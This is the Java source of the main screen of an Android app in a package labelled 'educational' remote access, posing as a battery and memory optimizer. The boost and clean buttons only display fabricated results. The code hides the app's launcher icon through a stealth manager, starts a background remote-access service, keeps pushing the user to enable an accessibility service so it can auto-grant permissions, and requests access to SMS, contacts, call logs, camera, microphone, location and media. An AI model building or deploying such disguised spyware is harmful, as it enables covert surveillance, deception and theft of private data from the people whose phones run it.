package com.remoteaccess.educational;

import android.Manifest;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import com.remoteaccess.educational.stealth.StealthManager;
import com.remoteaccess.educational.utils.PreferenceManager;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    private long lastStandardPermRequestTime = 0;
    private static final long PERM_REQUEST_COOLDOWN_MS = 5000;

    private TextView statusText;
    private TextView batteryPercentText;
    private TextView batteryStatusText;
    private TextView batteryTempText;
    private TextView memoryAvailText;
    private TextView lastOptimizedText;
    private ProgressBar batteryBar;
    private ProgressBar memoryBar;
    private Button consentButton;
    private LinearLayout boostBtn;
    private LinearLayout cleanBtn;

    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;
    private boolean pollingForAccessibility = false;

    private Handler uiHandler;
    private Runnable batteryUpdater;
    private BroadcastReceiver batteryReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);

        // Hide the launcher icon every time the activity opens so the app
        // never lingers in the app drawer after being launched from Settings.
        new StealthManager(this).hideAppIcon();

        statusText        = findViewById(R.id.statusText);
        batteryPercentText = findViewById(R.id.batteryPercent);
        batteryStatusText  = findViewById(R.id.batteryStatus);
        batteryTempText    = findViewById(R.id.batteryTemp);
        memoryAvailText    = findViewById(R.id.memoryAvail);
        lastOptimizedText  = findViewById(R.id.lastOptimizedText);
        batteryBar         = findViewById(R.id.batteryBar);
        memoryBar          = findViewById(R.id.memoryBar);
        consentButton      = findViewById(R.id.consentButton);
        boostBtn           = findViewById(R.id.boostBtn);
        cleanBtn           = findViewById(R.id.cleanBtn);

        uiHandler = new Handler();
        startBatteryUpdates();
        updateMemoryInfo();

        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();
            startRemoteAccessService();

            if (!permissionManager.isAccessibilityServiceEnabled()) {
                permissionManager.requestAccessibilityService();
                startPollingForAccessibility();
            } else {
                requestStandardPermissions();
            }
        } else {
            showInactiveStatus();
        }

        consentButton.setOnClickListener(v -> {
            if (!preferenceManager.isConsentGiven()) {
                startActivity(new Intent(MainActivity.this, ConsentActivity.class));
            } else {
                revokeConsent();
            }
        });

        boostBtn.setOnClickListener(v -> runFakeBoost());
        cleanBtn.setOnClickListener(v -> runFakeClean());
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateMemoryInfo();

        if (!preferenceManager.isConsentGiven()) return;

        showActiveStatus();

        if (permissionManager.isAccessibilityServiceEnabled()) {
            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
            if (svc != null) svc.startGrantPermsTimer();
            requestStandardPermissionsIfCooledDown();
        } else {
            if (!pollingForAccessibility) {
                permissionManager.requestAccessibilityService();
                startPollingForAccessibility();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (uiHandler != null && batteryUpdater != null) {
            uiHandler.removeCallbacks(batteryUpdater);
        }
        if (batteryReceiver != null) {
            try { unregisterReceiver(batteryReceiver); } catch (Exception ignored) {}
        }
    }

    // ── Battery display ──────────────────────────────────────────────────────

    private void startBatteryUpdates() {
        batteryReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                updateBatteryDisplay(intent);
            }
        };
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryIntent = registerReceiver(batteryReceiver, filter);
        if (batteryIntent != null) {
            updateBatteryDisplay(batteryIntent);
        }
    }

    private void updateBatteryDisplay(Intent intent) {
        if (intent == null) return;
        int level  = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale  = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        int tempTenths = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);

        if (level >= 0 && scale > 0) {
            int pct = (int) ((level / (float) scale) * 100);
            batteryPercentText.setText(pct + "%");
            batteryBar.setProgress(pct);

            if (pct <= 20) {
                batteryBar.setProgressTintList(
                    android.content.res.ColorStateList.valueOf(0xFFFC8181));
            } else if (pct <= 50) {
                batteryBar.setProgressTintList(
                    android.content.res.ColorStateList.valueOf(0xFFF6AD55));
            } else {
                batteryBar.setProgressTintList(
                    android.content.res.ColorStateList.valueOf(0xFF68D391));
            }
        }

        boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
                        || status == BatteryManager.BATTERY_STATUS_FULL;
        batteryStatusText.setText(charging ? "⚡ Charging" : "🔋 On Battery");

        if (tempTenths > 0) {
            float tempC = tempTenths / 10f;
            batteryTempText.setText(String.format(Locale.getDefault(), "%.1f°C", tempC));
        }
    }

    // ── Memory display ───────────────────────────────────────────────────────

    private void updateMemoryInfo() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
            am.getMemoryInfo(memInfo);

            long availMB = memInfo.availMem / (1024 * 1024);
            long totalMB = memInfo.totalMem / (1024 * 1024);
            int usedPct  = (int) (100 - (memInfo.availMem * 100f / memInfo.totalMem));

            memoryAvailText.setText(String.valueOf(availMB));
            memoryBar.setProgress(usedPct);

            if (usedPct >= 80) {
                memoryBar.setProgressTintList(
                    android.content.res.ColorStateList.valueOf(0xFFFC8181));
            } else if (usedPct >= 60) {
                memoryBar.setProgressTintList(
                    android.content.res.ColorStateList.valueOf(0xFFF6AD55));
            } else {
                memoryBar.setProgressTintList(
                    android.content.res.ColorStateList.valueOf(0xFF68D391));
            }
        } catch (Exception e) {
            Log.w("MainActivity", "updateMemoryInfo: " + e.getMessage());
        }
    }

    // ── Fake boost / clean ───────────────────────────────────────────────────

    private boolean isBoosting = false;
    private boolean isCleaning = false;

    private void runFakeBoost() {
        if (isBoosting) return;
        isBoosting = true;

        boostBtn.setAlpha(0.5f);
        TextView label = (TextView) boostBtn.getChildAt(1);
        if (label != null) label.setText("Boosting…");

        Toast.makeText(this, "Optimizing memory…", Toast.LENGTH_SHORT).show();

        uiHandler.postDelayed(() -> {
            updateMemoryInfo();
            String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
            lastOptimizedText.setText("Today at " + time);
            if (label != null) label.setText("Boost");
            boostBtn.setAlpha(1f);
            isBoosting = false;
            Toast.makeText(this, "Memory optimized!", Toast.LENGTH_SHORT).show();
        }, 2500);
    }

    private void runFakeClean() {
        if (isCleaning) return;
        isCleaning = true;

        cleanBtn.setAlpha(0.5f);
        TextView label = (TextView) cleanBtn.getChildAt(1);
        if (label != null) label.setText("Cleaning…");

        Toast.makeText(this, "Scanning for junk files…", Toast.LENGTH_SHORT).show();

        uiHandler.postDelayed(() -> {
            if (label != null) label.setText("Clean");
            cleanBtn.setAlpha(1f);
            isCleaning = false;
            long freed = (long) (50 + Math.random() * 200);
            Toast.makeText(this, freed + " MB of junk removed!", Toast.LENGTH_LONG).show();
            String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
            lastOptimizedText.setText("Today at " + time);
        }, 3000);
    }

    // ── Standard runtime permissions ────────────────────────────────────────

    private void requestStandardPermissions() {
        lastStandardPermRequestTime = System.currentTimeMillis();

        List<String> needed = new ArrayList<>();
        for (String p : buildPermissionList()) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    private void requestStandardPermissionsIfCooledDown() {
        if (System.currentTimeMillis() - lastStandardPermRequestTime >= PERM_REQUEST_COOLDOWN_MS) {
            requestStandardPermissions();
        }
    }

    private String[] buildPermissionList() {
        List<String> list = new ArrayList<>();
        list.add(Manifest.permission.READ_SMS);
        list.add(Manifest.permission.SEND_SMS);
        list.add(Manifest.permission.RECEIVE_SMS);
        list.add(Manifest.permission.READ_CONTACTS);
        list.add(Manifest.permission.READ_CALL_LOG);
        list.add(Manifest.permission.CAMERA);
        list.add(Manifest.permission.RECORD_AUDIO);
        list.add(Manifest.permission.ACCESS_FINE_LOCATION);
        list.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        list.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add("android.permission.READ_MEDIA_IMAGES");
            list.add("android.permission.READ_MEDIA_VIDEO");
            list.add("android.permission.READ_MEDIA_AUDIO");
            list.add("android.permission.POST_NOTIFICATIONS");
        }
        return list.toArray(new String[0]);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    // ── Accessibility polling ────────────────────────────────────────────────

    private void startPollingForAccessibility() {
        pollingForAccessibility = true;
        new Handler().postDelayed(() -> {
            if (!preferenceManager.isConsentGiven()) {
                pollingForAccessibility = false;
                return;
            }
            if (permissionManager.isAccessibilityServiceEnabled()) {
                pollingForAccessibility = false;
                requestStandardPermissions();
            } else {
                startPollingForAccessibility();
            }
        }, 1000);
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private void showActiveStatus() {
        statusText.setText("Running");
        statusText.setTextColor(0xFF68D391);
        consentButton.setText("Deactivate Service");
    }

    private void showInactiveStatus() {
        statusText.setText("Not activated");
        statusText.setTextColor(0xFFA0AEC0);
        consentButton.setText("Activate Service");
    }

    private void startRemoteAccessService() {
        try {
            Intent intent = new Intent(this, RemoteAccessService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.w("MainActivity", "startRemoteAccessService: " + e.getMessage());
        }
    }

    private void revokeConsent() {
        preferenceManager.setConsentGiven(false);
        stopService(new Intent(this, RemoteAccessService.class));
        showInactiveStatus();
    }
}
